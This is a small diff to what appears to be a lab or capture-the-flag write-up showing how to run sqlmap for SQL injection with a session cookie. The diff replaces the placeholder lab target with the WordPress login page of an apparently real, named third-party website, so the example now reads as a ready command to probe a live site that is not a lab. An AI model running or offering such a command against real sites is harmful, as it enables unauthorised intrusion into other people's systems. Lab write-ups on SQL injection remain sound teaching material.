@@ -5,7 +5,7 @@ It requires the url and the cookie. Use cookie editor plug-in to find the cookie
 
 Command
 ```bash
-sqlmap -u 'http://<TARGET IP>/dashboard.php?search=any+query' --cookie="PHPSESSID=<YOUR COOKIE>"
+sqlmap -u 'https://mickmccarty.com/wp-login.php' --cookie="wordpress_test_cookie=WP%20Cookie%20check"
 ```
 
 Result
